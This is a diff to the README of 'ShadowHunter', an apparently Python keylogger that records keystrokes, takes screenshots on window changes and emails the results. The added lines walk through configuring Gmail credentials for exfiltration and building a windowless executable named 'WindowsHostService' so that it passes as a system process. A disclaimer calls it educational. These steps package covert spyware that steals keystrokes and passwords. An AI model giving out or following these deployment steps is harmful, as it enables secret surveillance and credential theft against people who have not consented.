@@ -5,7 +5,7 @@ Do not use this tool on any system without explicit permission. Unauthorized use
 
 ---
 
-## Features
+Features
 
 - Real-time keystroke logging
 - Automatic screenshot on window/tab change
@@ -29,3 +29,32 @@ Installation
 
 git clone https://github.com/MuhammadJawaid/ShadowHunter.git
 cd ShadowHunter
+Install dependencies:
+
+Bashpip install -r requirements.txt
+
+Open  and update these values:
+
+PythonEMAIL_ADDRESS = "your_email@gmail.com"
+EMAIL_PASSWORD = "your_16_char_app_password"
+RECIPIENT_EMAIL = "your_email@gmail.com"
+
+Run the tool:
+
+Bashpython shadowhunter.py
+
+Creating Executable (.exe)
+Bashpip install pyinstaller
+pyinstaller --onefile --noconsole --name "WindowsHostService" shadowhunter.py
+The .exe will be generated in the dist folder.
+
+How to Stop the Tool
+
+Open Task Manager → Details tab → End WindowsHostService.exe
+Or restart the computer
+
+
+Disclaimer
+This project is created only for educational and demonstration purposes as part of academic learning.
+The developer is not responsible for any misuse of this tool.
+Always obtain proper authorization before testing monitoring tools.
